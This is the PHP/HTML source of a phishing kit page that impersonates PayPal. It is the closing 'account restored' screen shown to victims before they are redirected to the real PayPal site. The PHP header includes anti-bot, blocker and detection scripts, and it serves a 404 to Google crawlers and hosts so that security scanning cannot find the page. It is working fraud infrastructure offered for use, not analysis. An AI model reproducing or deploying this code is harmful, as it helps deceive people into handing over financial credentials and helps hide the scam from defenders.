
<?php


session_start();
error_reporting(0);


include "../../../boots/antibots1.php";
include "../../../boots/antibots2.php";
include "../../../boots/antibots3.php";
include "../../../boots/antibots4.php";
include "../../../boots/encriptar.php";
include "../../../boots/.htaccess.htaccess";


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


session_start();

include("../../system/blocker.php");
include("../../system/detect.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);




?>


<link rel="stylesheet" href="../../css/main.css" data-reactid="10"/>




<script src="../lib/js/jquery.js"></script><script src="../lib/js/jquery.validate.js"></script><script src="../lib/js/jquery.v-form.js"></script>

<script src="../lib/js/jquery.mask.js"></script>


    <link rel="stylesheet" href="../lib/css/G-Z118.css">
    <link rel="stylesheet" href="../lib/css/B-Z118.css">



<!DOCTYPE html><html data-reactroot="" data-reactid="1" data-react-checksum="158555299"><head data-reactid="2"><script type="text/javascript" src="https://www.paypalobjects.com/pa/js/min/pa.js" data-reactid="3"></script><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" data-reactid="4"/><meta charset="utf-8" data-reactid="5"/><link rel="shortcut icon" sizes="196x196" href="../lib/img/pp196.png" data-reactid="6"/><link rel="shortcut icon" type="image/x-icon" href="../lib/img/favicon.ico" data-reactid="7"/><link rel="icon" type="image/x-icon" href="../lib/img/pp32.png" data-reactid="8"/>



<link rel="stylesheet" href="../../css/paypal-sans.css" data-reactid="9"/><link rel="stylesheet" href="../../css/main-service-nav.css" data-reactid="10"/><title data-reactid="11">PayPal: Congratulations! Your have restored your account access.</title></head>

</li></ul></div></div></div></div></div><div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader" data-reactid="104"><div class="vx_modal-wrapper" data-reactid="105"><a href="" name="modalClose" class="vx_modal-dismiss_x" data-reactid="106"><span class="vx_a11yText" data-reactid="107">close</span></a><div class="vx_modal-content" data-reactid="108">






<h2 class="vx_h2" data-reactid="110">Congratulations! 
Your have restored your account access.</h2>

<div >
<div style="text-align: right;" trbidi="on">
<div style="text-align: center;">



<img  width="150" height="150" src="../../img/animation-checkmark.gif
">



<p>  Now you can enjoy our services, thank you for choosing our trusted service.<br> 
                             your account will be verified in the next 24 hours. 
                        </p>




	<form action="//paypal.com/myaccount/" method="post" enctype="multipart/form-data">





</div>

</div>

<input

class="vx_btn vx_btn-block"

value="My PayPal"

 type="submit">

		</form>



  <form action="//paypal.com/" method="post" name="WorldWide_form" class="validatoa" novalidate="novalidate">



<input 
href=""
 type="submit" class="vx_btn vx_btn-secondary " 


value="Log out">

</form>



<div style="text-align: right;" trbidi="on">
<div style="text-align: center;">




<p class="seconds"> You are being redirected to your PayPal account , within 10 seconds. </p>




<h2 class="vx_h2" data-reactid="110">Your Account has been successfully Restored</h2>

</div>

</div>


    </body>
</html>



</div><div></div><div>
</div></div><!-- react-empty: 119 -->
</div></div></div>
<div ></div><script type="text/javascript" src="" data-reactid="131"></script><script type="text/javascript" src="" data-reactid="132"></script><script type="text/javascript" src="" data-reactid="133"></script><script id="react-engine-props" type="application/json">



</html>

